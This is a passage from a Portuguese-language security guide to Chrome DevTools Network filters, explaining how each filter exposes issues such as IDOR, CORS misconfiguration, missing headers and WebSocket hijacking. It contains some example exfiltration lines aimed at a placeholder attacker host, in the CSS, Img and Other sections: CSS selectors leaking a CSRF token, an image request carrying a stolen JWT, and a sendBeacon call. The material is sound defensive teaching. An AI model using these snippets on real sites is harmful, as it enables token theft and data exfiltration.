  1. **IDOR / BOLA (Insecure Direct Object Reference / Broken Object Level Authorization)**: URLs previsíveis como `GET /api/v1/faturas/1001` que, quando chamadas para `1002`, retornam os dados de outro cliente.
  2. **Excessive Data Exposure (Exposição Excessiva de Dados)**: a resposta JSON de `GET /api/v1/usuarios/42` retorna `"senha_hash"`, `"cpf"`, `"salario"` e `"token_recuperacao"`, embora a tela mostre apenas o nome do usuário.
  3. **Mass Assignment (Atribuição em Massa)**: o payload de `PATCH /api/v1/usuarios/42` aceita campos extras como `{"nome": "João", "isAdmin": true}`.
  4. **Preflight CORS inseguro**: requisições `OPTIONS` seguidas de chamadas `fetch` onde o servidor responde com `Access-Control-Allow-Origin` refletindo origens não confiáveis com `Access-Control-Allow-Credentials: true`.
- **Como investigar o problema**: selecione **Fetch/XHR**, navegue por todas as funcionalidades da aplicação e inspecione sistematicamente as abas **Headers**, **Payload** e **Preview/Response** de cada requisição.
- **Como corrigir ou prevenir**: validar autorização em nível de objeto e propriedade em cada endpoint da API (**[REQUISITO]**), utilizar DTOs de entrada e saída (**[REQUISITO]**) e configurar CORS com lista estrita de origens permitidas (**[REQUISITO]**).

##### Doc

- **Nome do parâmetro**: **Doc** (*Document* — Documentos HTML e quadros).
- **O que significa**: filtro de categoria que exibe apenas as requisições cujo destino (`Sec-Fetch-Dest: document` ou `iframe`) é o carregamento do documento HTML principal da janela ou de documentos HTML carregados dentro de elementos `<iframe>`, `<frame>` ou `<object>`.
- **Para que serve**: inspecionar a requisição inicial de navegação da página, cadeias de redirecionamento (`301`, `302`) e os cabeçalhos HTTP de segurança que governam o contexto de execução do documento no navegador.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Doc**.
- **Exemplo prático**:
  Ao acessar `http://loja-ficticia.test`, ativar **Preserve log** e clicar no filtro **Doc**, você observa:
  1. `GET http://loja-ficticia.test/` → `301 Moved Permanently` (`Location: https://loja-ficticia.test/`)
  2. `GET https://loja-ficticia.test/` → `200 OK` (`Type: document`, `Content-Type: text/html; charset=utf-8`)
  3. `GET https://pagamentos.exemplo.test/checkout-embed` → `200 OK` (`Type: document`, carregado dentro de um `<iframe>`).
- **Comportamento normal**: geralmente há 1 requisição `document` para a página principal e, opcionalmente, requisições adicionais para cada `<iframe>` presente na tela.
- **O que seria considerado seguro**: é justamente nas respostas do filtro **Doc** que **obrigatoriamente** devem estar presentes os principais **Headers de Segurança de Documento**, tais como `Content-Security-Policy` (CSP), `Strict-Transport-Security` (HSTS), `X-Frame-Options` (ou `frame-ancestors` na CSP), `X-Content-Type-Options: nosniff`, `Referrer-Policy` e `Permissions-Policy` **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  1. Ausência de `X-Frame-Options` e de `Content-Security-Policy: frame-ancestors` na resposta **Doc** de páginas autenticadas, deixando a aplicação vulnerável a **Clickjacking (UI Redressing)**.
  2. Ausência de `Content-Security-Policy` na resposta **Doc**, reduzindo a defesa em profundidade contra **Cross-Site Scripting (XSS)**.
  3. Documento principal carregado sobre `http://` sem redirecionamento para `https://` e sem HSTS.
  4. Comentários HTML esquecidos no código-fonte da resposta **Doc** (`<!-- TODO: remover rota /admin-debug?bypass=1 -->`).
- **Como investigar o problema**: clique no filtro **Doc**, selecione a requisição principal da página, verifique todos os **Response Headers** na aba **Headers** e depois pesquise (`Ctrl + F`) na aba **Response** por `<!--`, `TODO`, `FIXME`, `admin`, `key` ou `secret`.
- **Como corrigir ou prevenir**: configurar os headers de segurança nos documentos HTML servidos pelo servidor web/proxy reverso (**[RECOMENDAÇÃO]**) e remover comentários de desenvolvimento durante o processo de *build* (**[BOA PRÁTICA]**).

##### CSS

- **Nome do parâmetro**: **CSS** (*Cascading Style Sheets* — Folhas de Estilo em Cascata).
- **O que significa**: filtro de categoria que exibe apenas requisições de arquivos de folha de estilo (`<link rel="stylesheet" href="...">` ou `@import`), cujo tipo de recurso é `stylesheet` (`Content-Type: text/css`).
- **Para que serve**: analisar o carregamento visual da página, verificar o tamanho e o cacheamento de folhas de estilo e auditar a origem de arquivos CSS externos.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **CSS**.
- **Exemplo prático**:
  Ao clicar em **CSS**, a tabela lista `main.8f92a.css` (`Status: 200`, `Type: stylesheet`, `Size: 18.4 kB`).
- **Comportamento normal**: arquivos CSS estáticos costumam ser servidos com cache de longa duração (`Cache-Control: public, max-age=31536000, immutable`) quando possuem hash no nome do arquivo.
- **O que seria considerado seguro**:
  - Arquivos CSS servidos exclusivamente com `Content-Type: text/css` e acompanhados do cabeçalho `X-Content-Type-Options: nosniff`.
  - Folhas de estilo carregadas de CDNs externas utilizando o atributo de integridade **SRI (`integrity="sha384-..."`)**.
- **O que poderia indicar uma vulnerabilidade**:
  1. **CSS Injection / Exfiltração via Seletores CSS**: se um atacante conseguir injetar regras CSS na página, ele pode roubar valores de atributos HTML (como um token CSRF em `<input name="csrf" value="a8f9...">`) usando seletores como `input[name="csrf"][value^="a"] { background: url("https://atacante.test/leak?char=a"); }`.
  2. **Arquivo `.css.map` exposto**: notar na lista a requisição ou referência `/*# sourceMappingURL=main.css.map */` expondo a estrutura interna do projeto SASS/LESS.
  3. **RSSI (Relative Path Overwrite / Cross-Site Script Inclusion via CSS)**: quando uma página dinâmica é carregada como stylesheet sem `X-Content-Type-Options: nosniff`.
- **Como investigar o problema**: filtre por **CSS**, verifique os domínios de origem de cada folha de estilo e confira na aba **Headers** se `X-Content-Type-Options: nosniff` está presente.
- **Como corrigir ou prevenir**: enviar `X-Content-Type-Options: nosniff` em todas as respostas (**[REQUISITO]**), restringir origens de estilo com `style-src` na CSP (**[RECOMENDAÇÃO]**) e usar SRI em folhas de estilo de terceiros (**[RECOMENDAÇÃO]**).

##### JS

- **Nome do parâmetro**: **JS** (Arquivos JavaScript).
- **O que significa**: filtro de categoria que exibe todas as requisições de scripts JavaScript carregados pela página (`<script src="...">`, módulos ES6 `import()`, `import()` dinâmico, *Web Workers* e *Service Workers*), além de seus respectivos mapas de código-fonte (**Source Maps** `.js.map`) quando aplicável.
- **Para que serve**: inspecionar todos os scripts executados no contexto da aplicação, verificar de quais domínios eles vêm e examinar o código-fonte entregue ao cliente em busca de rotas ocultas, chaves de API ou falhas de lógica.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **JS**.
- **Exemplo prático**:
  Ao selecionar **JS**, o analista vê `app.bundle.js`, `vendor.js` e `https://cdn.terceiro.test/sdk.js`.
- **Comportamento normal**: páginas modernas carregam um ou mais *bundles* JavaScript principais e *chunks* sob demanda conforme o usuário navega pelas rotas da aplicação.
- **O que seria considerado seguro**:
  - Nenhum segredo de servidor (chaves privadas da AWS, tokens de administração do Stripe/Banco, senhas de banco de dados) presente dentro dos arquivos `.js` (apenas chaves públicas projetadas para uso no cliente, devidamente restritas por domínio/escopo).
  - Scripts de terceiros protegidos com **Subresource Integrity (SRI)** (`<script src="..." integrity="sha384-..." crossorigin="anonymous">`).
  - Ausência de arquivos `.js.map` (*Source Maps*) acessíveis publicamente em produção (a menos que seja um projeto de código aberto).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Hardcoded Secrets (Segredos Chumbados no Front-End)**: encontrar dentro de `config.js` ou `bundle.js` strings como `AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/..."` ou `ADMIN_API_TOKEN = "Bearer eyJ..."`.
  2. **Exposição de Rotas Administrativas Ocultas**: mesmo que o menu da tela não mostre o link para um usuário comum, o arquivo `routes.js` contém todas as rotas da SPA (`/admin/usuarios/deletar`, `/api/v1/debug/exportar-banco`).
  3. **Inclusão de Script sem HTTPS ou de Domínio Comprometido**: carregar um arquivo `.js` via `http://` (*Mixed Content* ativo) ou de um subdomínio abandonado vulnerável a *Subdomain Takeover*.
- **Como investigar o problema**: filtre por **JS**, abra a busca global da aba Network (`Ctrl + F`) e pesquise dentro dos arquivos JavaScript por termos como `api_key`, `secret`, `password`, `token`, `admin`, `internal`, `Bearer`, `http://` e `/api/`. Verifique também se adicionar `.map` ao final da URL do `.js` faz o download do código-fonte original não minificado.
- **Como corrigir ou prevenir**: manter todas as chaves secretas e credenciais exclusivamente em variáveis de ambiente no **back-end** (**[REQUISITO]**), bloquear o acesso público a arquivos `*.map` no servidor de produção (**[RECOMENDAÇÃO]**) e aplicar **SRI** e **CSP (`script-src`)** rigorosa (**[RECOMENDAÇÃO]**).

##### Font

- **Nome do parâmetro**: **Font** (Fontes tipográficas web).
- **O que significa**: filtro de categoria que exibe exclusivamente requisições de arquivos de fontes tipográficas (`woff`, `woff2`, `ttf`, `otf`) carregadas via regras `@font-face` no CSS.
- **Para que serve**: diagnosticar problemas de carregamento de tipografia, verificar configurações de **CORS** para fontes (já que a especificação CSS exige CORS para carregamento de fontes entre origens diferentes) e auditar vazamentos de privacidade para provedores de fontes externos.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Font**.
- **Exemplo prático**:
  Ao filtrar por **Font**, você vê `Inter-Regular.woff2` carregado de `https://loja-ficticia.test/fonts/` ou de `https://fonts.gstatic.com/`.
- **Comportamento normal**: arquivos `.woff2` estáticos carregados com sucesso (`200 OK`) e armazenados em cache por longos períodos. Quando carregados de outro domínio (como uma CDN), exigem o cabeçalho `Access-Control-Allow-Origin` na resposta.
- **O que seria considerado seguro**: hospedar as fontes localmente no próprio domínio da aplicação (*self-hosting*) ou em CDN própria com `Access-Control-Allow-Origin` restrito ao domínio da aplicação **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Vazamento de URL/IP via Referer para terceiros**: se uma página interna sensível (ex.: `https://intranet.empresa.test/processo-judicial/99812`) carrega fontes de um servidor de terceiros sem uma `Referrer-Policy` restritiva, o servidor externo recebe o IP do funcionário e a URL da intranet no cabeçalho `Referer` (o que já gerou sanções de privacidade sob o GDPR europeu e atenção sob a LGPD brasileira).
  2. **Exfiltração via `@font-face` (`unicode-range`)**: técnica avançada de ataque de injeção de CSS onde o atacante define fontes externas para caracteres individuais a fim de descobrir o texto renderizado na página sem usar JavaScript.
- **Como investigar o problema**: selecione **Font** e verifique na coluna **Domain** se fontes estão sendo buscadas em servidores de terceiros e qual cabeçalho `Referer` foi enviado nessas requisições.
- **Como corrigir ou prevenir**: hospedar arquivos `.woff2` no próprio servidor da aplicação (**[BOA PRÁTICA]**), configurar `Referrer-Policy: strict-origin-when-cross-origin` ou `no-referrer` (**[RECOMENDAÇÃO]**) e restringir `font-src` na **CSP** (**[RECOMENDAÇÃO]**).

##### Img

- **Nome do parâmetro**: **Img** (*Images* — Imagens).
- **O que significa**: filtro de categoria que exibe requisições de imagens (`png`, `jpg`, `jpeg`, `gif`, `webp`, `avif`, `svg`, `ico`), disparadas por tags `<img>`, `<picture>`, `favicon`, propriedades CSS `background-image` ou chamadas JavaScript `new Image()`.
- **Para que serve**: analisar o peso visual da página e — sob a ótica de segurança e privacidade — identificar **Web Beacons / Tracking Pixels** (pixels de rastreamento de 1x1 pixel), vazamentos de `Referer` e tentativas de **CSRF via GET** ou exfiltração de dados via URL de imagem.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Img**.
- **Exemplo prático**:
  Ao filtrar por **Img**, além de `banner-promocao.webp`, o analista nota uma requisição suspeita:
  ```text
  GET https://analytics-externo.test/pixel.gif?uid=42&email=joao@exemplo.test
  ```
- **Comportamento normal**: carregamento de imagens de layout, fotos de produtos e ícones da própria aplicação ou de sua CDN de mídia.
- **O que seria considerado seguro**:
  - Imagens de avatares enviadas por usuários sendo servidas a partir de um domínio separado de *sandbox* (ex.: `usercontent.loja-ficticia.test`) com `Content-Type` estrito (`image/png`, `image/jpeg`, `image/webp`) e `X-Content-Type-Options: nosniff`.
  - Ausência de dados pessoais (PII) em *query strings* de pixels de rastreamento.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Exfiltração de dados via `Img` (XSS Data Exfiltration)**: mesmo que a **CSP** bloqueie `connect-src` (impedindo `fetch()`), se `img-src *` estiver liberado, um script XSS rouba dados enviando `new Image().src = 'https://atacante.test/roubo.png?jwt=' + localStorage.getItem('token')`. Essa requisição aparece justamente no filtro **Img**!
  2. **CSRF via `<img>` em endpoints GET mal projetados**: um usuário posta no fórum uma imagem `<img src="https://loja-ficticia.test/api/usuario/excluir-conta?id=42">`. Como o navegador tenta carregar a URL como imagem enviando os cookies automaticamente, se o servidor realizar ações destrutivas via `GET`, a conta é excluída.
  3. **Upload de SVG malicioso / Polyglot File**: arquivos `.svg` enviados por usuários contendo `<script>` que, se abertos diretamente como documento sem `Content-Security-Policy: sandbox`, executam XSS armazenado.
- **Como investigar o problema**: clique em **Img**, ordene pela coluna **Domain** para ver todas as imagens de domínios externos e observe se há parâmetros de *query string* longos nas URLs das imagens.
- **Como corrigir ou prevenir**: nunca realizar alterações de estado no servidor via método `GET` (**[REQUISITO]**), reprocessar/converter imagens enviadas por usuários no back-end ou isolar SVGs com `Content-Disposition: attachment` e `Content-Security-Policy: sandbox` (**[REQUISITO]**), e restringir `img-src` na CSP (**[RECOMENDAÇÃO]**).

##### Media

- **Nome do parâmetro**: **Media** (Mídia — Áudio e Vídeo).
- **O que significa**: filtro de categoria que exibe requisições de arquivos ou *streams* de áudio e vídeo (`mp4`, `webm`, `mp3`, `ogg`, `wav`) disparadas pelas tags HTML5 `<video>` e `<audio>`.
- **Para que serve**: inspecionar o carregamento de mídia sob demanda, transferências parciais baseadas em intervalos de bytes (**HTTP Range Requests** que retornam `206 Partial Content`) e verificar controles de acesso a conteúdos de vídeo restritos (como aulas de uma plataforma de ensino ou gravações privadas).
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Media**.
- **Exemplo prático**:
  Ao dar *play* em uma videoaula em `https://escola.exemplo.test/aula/15` e selecionar **Media**, você vê múltiplas requisições `GET https://midia.exemplo.test/videos/aula15.mp4` com cabeçalho de requisição `Range: bytes=0-1048575` e resposta `206 Partial Content` (`Content-Range: bytes 0-1048575/52428800`).
  *(Nota técnica: transmissões modernas adaptativas via **HLS — HTTP Live Streaming** `.m3u8`/`.ts` ou **MPEG-DASH** `.mpd`/`.m4s` costumam ser buscadas por bibliotecas JavaScript via `fetch()` e, por isso, frequentemente aparecem sob **Fetch/XHR** em vez de **Media**).*
- **Comportamento normal**: respostas `206 Partial Content` conforme o usuário avança a barra de progresso do vídeo.
- **O que seria considerado seguro**: vídeos privados ou pagos protegidos por URLs assinadas temporariamente (*Presigned URLs* com expiração curta, ex.: `?X-Amz-Expires=300&X-Amz-Signature=...`) ou tokens de sessão validados a cada segmento, além de `Cross-Origin-Resource-Policy: same-site` ou `same-origin` para evitar *hotlinking* externo.
- **O que poderia indicar uma vulnerabilidade**:
  1. **IDOR em arquivos de mídia privada**: a URL do vídeo da consulta médica confidencial é `https://clinica.exemplo.test/gravacoes/consulta_1042.mp4` sem nenhuma autenticação ou assinatura; trocar `1042` por `1043` permite baixar a gravação de outro paciente.
  2. **DoS por Range Header malformado**: servidores desatualizados que não limitam múltiplos intervalos sobrepostos no cabeçalho `Range: bytes=0-1,0-2,0-3...`.
- **Como investigar o problema**: filtre por **Media**, copie a URL do arquivo de áudio/vídeo privado e tente abri-la em uma janela anônima (*Incognito*) sem estar logado ou alterando o identificador numérico na URL.
- **Como corrigir ou prevenir**: validar autenticação/autorização no servidor de mídia ou emitir **URLs pré-assinadas (*Signed URLs*)** de curta duração vinculadas à sessão **[REQUISITO]**.

##### Manifest

- **Nome do parâmetro**: **Manifest** (*Web App Manifest* — Manifesto de Aplicativo Web).
- **O que significa**: filtro de categoria que exibe a requisição do arquivo de manifesto de **PWA (Progressive Web App)**, geralmente chamado `manifest.json` ou `site.webmanifest` (referenciado no HTML por `<link rel="manifest" href="/manifest.json">` e servido com `Content-Type: application/manifest+json`).
- **Para que serve**: verificar se o manifesto da aplicação progressiva foi baixado corretamente pela rede (complementando a visualização estruturada existente em `Application → Manifest`).
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Manifest**.
- **Exemplo prático**:
  Ao filtrar por **Manifest**, aparece a linha `manifest.json` (`Status: 200`, `Type: manifest`, `Size: 820 B`) contendo `name`, `short_name`, `start_url`, `display`, `background_color` e `icons`.
- **Comportamento normal**: zero ou uma requisição por página carregada.
- **O que seria considerado seguro**: arquivo `manifest.json` estático, servido via HTTPS da mesma origem, definindo um `start_url` e `scope` restritos ao próprio caminho da aplicação.
- **O que poderia indicar uma vulnerabilidade**:
  - Se a requisição a `/manifest.json` em uma página autenticada de outro domínio for feita sem o atributo `crossorigin="use-credentials"` (ou com `crossorigin` mal configurado), ou se o arquivo `manifest.json` for gerado dinamicamente refletindo parâmetros da URL sem sanitização com `Content-Type: text/html` por erro de rota (levando a XSS).
- **Como investigar o problema**: selecione **Manifest**, verifique o `Status Code`, o `Content-Type` (`application/manifest+json`) e inspecione a aba **Response** para validar o JSON.
- **Como corrigir ou prevenir**: servir o arquivo `manifest.json` com o cabeçalho `Content-Type: application/manifest+json` e `X-Content-Type-Options: nosniff` **[BOA PRÁTICA]**.

##### WS (ou Socket)

- **Nome do parâmetro**: **WS** ou **Socket** **[Varia por versão]** (WebSockets e conexões de soquete em tempo real — em versões mais antigas do Chrome o botão chamava-se **WS**; em versões recentes foi renomeado para **Socket** para abranger **WebSockets**, **WebTransport** e **Direct Sockets**).
- **O que significa**: filtro de categoria que exibe exclusivamente conexões bidirecionais persistentes e de baixa latência iniciadas pelo protocolo **WebSocket** (`ws://` ou `wss://` — RFC 6455) ou **WebTransport**.
- **Para que serve**: inspecionar o *handshake* inicial de atualização de protocolo (`HTTP/1.1 101 Switching Protocols` com cabeçalhos `Connection: Upgrade` e `Upgrade: websocket`) e monitorar em tempo real todas as mensagens (quadros/*frames* de texto, JSON ou binários) enviadas pelo cliente (`⬆️` seta verde para cima) e recebidas do servidor (`⬇️` seta para baixo) na sub-aba **Messages**.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Socket** (ou **WS**).
- **Exemplo prático**:
  Em um sistema de chat ou pregão financeiro (`https://bolsa.exemplo.test`), você clica em **Socket**, seleciona a linha `wss://stream.bolsa.exemplo.test/ws/cotacoes`, vê `Status: 101 Switching Protocols` e clica na sub-aba **Messages** para ler cada pacote JSON trocado ao vivo:
  ```json
  {"action": "subscribe", "channel": "ordens_usuario_42"}
  ```
- **Comportamento normal**: a conexão permanece com estado `101 Switching Protocols` (e `Time: Pending` ou em andamento, visível com `is:running`) enquanto a página estiver aberta, trocando quadros na aba **Messages**.
- **O que seria considerado seguro**:
  1. Uso exclusivo do esquema criptografado **`wss://`** (WebSocket over TLS) **[REQUISITO]**.
  2. Validação rigorosa do cabeçalho **`Origin`** no servidor durante o *handshake* do WebSocket, visto que a **Same-Origin Policy (SOP)** e o **CORS** padrão **não impedem** que uma página maliciosa em `https://atacante.test` abra uma conexão WebSocket para `wss://banco.exemplo.test/ws` enviando automaticamente os cookies da vítima (**CSWSH — Cross-Site WebSocket Hijacking**) **[REQUISITO]**.
  3. Validação de autorização para cada mensagem/canal assinado dentro do WebSocket.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Conexão `ws://` sem TLS**: tráfego em tempo real passando em texto claro.
  2. **Cross-Site WebSocket Hijacking (CSWSH)**: o *handshake* do WebSocket autentica o usuário apenas pelo cookie `Cookie: sid=...` e o servidor não verifica se o cabeçalho `Origin` pertence ao domínio legítimo nem exige um token anti-CSRF / token no *handshake*.
  3. **IDOR / Falha de Autorização em Canais WebSocket**: na aba **Messages**, ver que o cliente envia `{"subscribe": "chat_privado_42"}` e que o servidor aceita se alguém enviar `{"subscribe": "chat_privado_1"}` sem verificar a permissão.
- **Como investigar o problema**: filtre por **Socket** (**WS**), clique na conexão `101`, examine na aba **Headers** os cabeçalhos `Origin`, `Cookie` e `Sec-WebSocket-Key`, e depois abra a aba **Messages** para analisar a estrutura de todos os pacotes enviados e recebidos.
- **Como corrigir ou prevenir**: usar apenas `wss://` (**[REQUISITO]**), validar estritamente o cabeçalho `Origin` no servidor durante o *upgrade* para WebSocket (**[REQUISITO]**), exigir um token de autenticação de uso único (ticket) no *handshake* (**[RECOMENDAÇÃO]**) e validar permissões a cada mensagem recebida no socket (**[REQUISITO]**).

##### Wasm

- **Nome do parâmetro**: **Wasm** (*WebAssembly* — Binários WebAssembly `.wasm`).
- **O que significa**: filtro de categoria que exibe requisições de módulos binários **WebAssembly** (`Content-Type: application/wasm`), uma tecnologia que permite executar código compilado de linguagens como C, C++, Rust e Go em velocidade próxima à nativa dentro do sandbox do navegador.
- **Para que serve**: isolar o download de módulos `.wasm` (usados em editores gráficos web, jogos, reprodutores de vídeo, bibliotecas criptográficas ou leitores de PDF no cliente).
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Wasm**.
- **Exemplo prático**:
  Ao abrir um editor de imagens online e filtrar por **Wasm**, a tabela exibe `image-processor.wasm` (`Status: 200`, `Type: wasm`, `Size: 1.8 MB`).
- **Comportamento normal**: aparece apenas em aplicações que utilizam WebAssembly; na maioria dos sites tradicionais, a lista sob este filtro permanece vazia.
- **O que seria considerado seguro**: módulos `.wasm` carregados da mesma origem via HTTPS, com `Content-Type: application/wasm` correto, integridade verificada via **SRI** (quando aplicável) e permissões de compilação controladas pela diretiva `'wasm-unsafe-eval'` na **Content Security Policy (CSP)** (que é mais segura do que liberar `'unsafe-eval'` completo para o JavaScript).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Cryptojacking (Mineração oculta de criptomoedas)**: páginas comprometidas por XSS ou scripts de anúncios maliciosos que baixam silenciosamente um módulo `miner.wasm` em segundo plano e consomem 100% da CPU do visitante.
  2. **Lógica de validação de licença ou chaves secretas escondidas dentro do `.wasm`**: desenvolvedores que compilam chaves secretas de API em C/Rust achando que, por ser binário `.wasm`, ninguém conseguirá ler (quando na verdade o DevTools descompila o `.wasm` automaticamente para o formato legível **WAT — WebAssembly Text Format** na aba **Sources**!).
- **Como investigar o problema**: filtre por **Wasm**; se encontrar um arquivo `.wasm`, clique com o botão direito nele → **Open in Sources panel** (onde o Chrome mostra a representação textual *disassembled*) ou pesquise strings legíveis no binário.
- **Como corrigir ou prevenir**: nunca armazenar chaves privadas ou segredos de servidor dentro de binários `.wasm` entregues ao cliente (**[REQUISITO]**) e monitorar o carregamento de módulos `.wasm` não autorizados com **CSP** (**[RECOMENDAÇÃO]**).

##### Other

- **Nome do parâmetro**: **Other** (Outros tipos de recurso).
- **O que significa**: filtro residual que agrupa todas as requisições cujo tipo não se enquadra nas categorias anteriores (`Fetch/XHR`, `Doc`, `CSS`, `JS`, `Font`, `Img`, `Media`, `Manifest`, `Socket`, `Wasm`). Isso inclui especialmente requisições de **`ping` / `beacon`** (disparadas por `navigator.sendBeacon()` ou pelo atributo `<a ping="...">`), relatórios de violação de **CSP (`csp-report`)**, relatórios da **Reporting API**, requisições de *preflight* **CORS (`OPTIONS`)** em determinadas visualizações ou recursos com MIME type desconhecido.
- **Para que serve**: capturar comunicações silenciosas de telemetria, relatórios de segurança do próprio navegador e chamadas disparadas no exato momento em que o usuário fecha ou sai da página (`unload` / `visibilitychange` via `navigator.sendBeacon()`).
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → último botão de tipo (**Other**).
- **Exemplo prático**:
  Quando uma página tenta carregar um script bloqueado pela CSP e possui `report-uri /csp-violation-report` configurado, o próprio navegador dispara automaticamente um `POST /csp-violation-report` com `Type: ping` ou `csp-report`, que aparece sob o filtro **Other**.
- **Comportamento normal**: exibe requisições `ping`, `beacon` de análises legítimas ou relatórios do navegador.
- **O que seria considerado seguro**: chamadas `ping`/`beacon` destinadas apenas ao endpoint oficial de métricas ou de relatórios de segurança (`report-to` / `report-uri`) da própria organização, sem dados pessoais sensíveis.
- **O que poderia indicar uma vulnerabilidade**:
  - **Exfiltração furtiva via `navigator.sendBeacon()`**: atacantes sofisticados usam `navigator.sendBeacon('https://atacante.test/collect', JSON.stringify(dadosRoubados))` porque o navegador envia essa requisição em segundo plano mesmo depois que a vítima fecha a aba, e ela **não aparece** no filtro `Fetch/XHR` — ela aparece apenas em **All** e em **Other** (`Type: ping`)!
- **Como investigar o problema**: com **Preserve log** ativado, clique no filtro **Other** após executar fluxos sensíveis ou navegar entre páginas e inspecione todas as requisições do tipo `ping` ou `other`, verificando seu **Domain** e seu **Request Payload**.
- **Como corrigir ou prevenir**: lembrar que `navigator.sendBeacon()` é governado pela diretiva **`connect-src`** da **Content Security Policy (CSP)**; portanto, restringir `connect-src` às origens confiáveis bloqueia o envio de *beacons* para servidores de atacantes **[RECOMENDAÇÃO]**.

##### Blocked response cookies

- **Nome do parâmetro**: **Blocked response cookies** (Cookies de resposta bloqueados).
- **O que significa**: caixa de seleção de filtro rápido que exibe exclusivamente as requisições cujas respostas continham pelo menos um cabeçalho **`Set-Cookie` que foi rejeitado/bloqueado pelo próprio navegador** por violar regras de segurança, sintaxe ou privacidade.
- **Para que serve**: diagnosticar instantaneamente por que um cookie enviado pelo servidor (por exemplo, um cookie de sessão após o login) não foi salvo pelo navegador, sem precisar procurar manualmente em dezenas de respostas.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros (à direita dos botões de tipo de recurso) → checkbox **Blocked response cookies**.
- **Exemplo prático**:
  O servidor responde `Set-Cookie: sessao=12345; SameSite=None` **sem** incluir o atributo `Secure`, ou tenta definir `Set-Cookie: __Host-token=abc; Path=/app; Secure` (violando a regra do prefixo `__Host-`, que exige `Path=/` e proíbe o atributo `Domain`). Ao marcar **Blocked response cookies**, apenas essa requisição fica visível na tabela, destacada em amarelo, e na sub-aba **Cookies** um ícone de exclamação (`⚠️`) explica o motivo exato do bloqueio.
- **Comportamento normal**: em uma aplicação bem configurada, marcar **Blocked response cookies** deve resultar em `0 requests` para os domínios da própria aplicação.
- **O que seria considerado seguro**: todos os cookies da aplicação sendo aceitos porque respeitam as exigências modernas dos navegadores (`Secure` em HTTPS, `SameSite` explícito, prefixos `__Host-` / `__Secure-` corretos).
- **O que poderia indicar uma vulnerabilidade**:
  1. Servidor tentando definir um cookie com a flag `Secure` sobre uma conexão não criptografada `http://`.
  2. Tentativa de *Session Fixation* ou *Cookie Tossing* entre subdomínios bloqueada pelas regras de prefixo `__Host-`.
  3. Configurações quebradas de autenticação *cross-origin* (`SameSite=None` sem `Secure`).
- **Como investigar o problema**: marque **Blocked response cookies**, clique na requisição listada, abra a sub-aba **Cookies** (ou **Headers**) e passe o mouse sobre o ícone de aviso amarelo (`⚠️`) ao lado da linha `Set-Cookie` para ler o diagnóstico oficial do Chrome.
- **Como corrigir ou prevenir**: corrigir a emissão do cabeçalho `Set-Cookie` no back-end para incluir `Secure; HttpOnly; SameSite=Lax` (ou `Strict`, ou `None; Secure` quando estritamente necessário entre sites com **CHIPS / `Partitioned`**) **[REQUISITO]**. Veja a [Seção 2.2.6 Aprofundamento em Segurança de Cookies](./02b-devtools-application.md#s2-2).

##### Blocked requests

- **Nome do parâmetro**: **Blocked requests** (Requisições bloqueadas).
- **O que significa**: caixa de seleção de filtro rápido que isola todas as requisições que o navegador **impediu de serem enviadas** ou cuja **resposta foi bloqueada** antes de ser entregue à página, devido a políticas de segurança do navegador (como **CSP — Content Security Policy**, **Mixed Content**, **CORP — Cross-Origin-Resource-Policy**, **ORB/CORB — Opaque Response Blocking**), bloqueio manual no DevTools (**Request blocking**) ou bloqueio por extensões (*AdBlockers*).
- **Para que serve**: identificar recursos que falharam por motivos de segurança ou políticas de isolamento de origem.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → checkbox **Blocked requests**.
- **Exemplo prático**:
  Uma página carregada em `https://loja-ficticia.test` tenta carregar um script `http://antigo.loja-ficticia.test/script.js` ou um script externo violando a CSP. Ao marcar **Blocked requests**, a requisição aparece em vermelho com a coluna `Status` exibindo:
  - `(blocked:mixed-content)` — bloqueado por ser HTTP dentro de página HTTPS.
  - `(blocked:csp)` — bloqueado pela Content Security Policy da página.
  - `(blocked:corp)` — bloqueado pela Cross-Origin-Resource-Policy do servidor de destino.
  - `(blocked:orb)` — bloqueado pelo Opaque Response Blocking (proteção contra ataques *Spectre* de leitura de memória entre origens).
  - `(blocked:devtools)` — bloqueado manualmente pelo usuário em *Request blocking*.
- **Comportamento normal**: em produção limpa e sem bloqueadores de anúncios, não deve haver requisições da própria aplicação bloqueadas.
- **O que seria considerado seguro**: durante um **teste de segurança em laboratório**, ver que a tentativa de injetar `<script src="https://atacante.test/xss.js"></script>` apareceu em **Blocked requests** com `(blocked:csp)`, comprovando que a política de CSP defendeu a aplicação com sucesso!
- **O que poderia indicar uma vulnerabilidade**:
  - Presença de `(blocked:mixed-content)` em produção, indicando que o código-fonte da aplicação ainda faz referências inseguras a `http://` (o que pode expor usuários em navegadores desatualizados ou em recursos passivos com auto-upgrade falho).
- **Como investigar o problema**: marque **Blocked requests**, observe o código entre parênteses na coluna **Status** (`csp`, `mixed-content`, `corp`, `orb`) e abra simultaneamente a aba **Console** (`Esc`) para ler a mensagem detalhada da diretiva que causou o bloqueio.
- **Como corrigir ou prevenir**: atualizar todas as URLs de recursos no código para `https://` (e adicionar `Content-Security-Policy: upgrade-insecure-requests`) (**[REQUISITO]**) e ajustar as políticas de CSP/CORP para permitir apenas origens legítimas necessárias (**[RECOMENDAÇÃO]**).

##### 3rd-party requests

- **Nome do parâmetro**: **3rd-party requests** (Requisições de terceiros).
- **O que significa**: caixa de seleção de filtro rápido que exibe apenas as requisições destinadas a **domínios de terceiros** (*third-party*), isto é, domínios cujo *site* registrável (**eTLD+1 — effective Top-Level Domain plus one**, como `google-analytics.com` ou `cdn-externa.test`) é diferente do domínio principal da página aberta na barra de endereços (`loja-ficticia.test`).
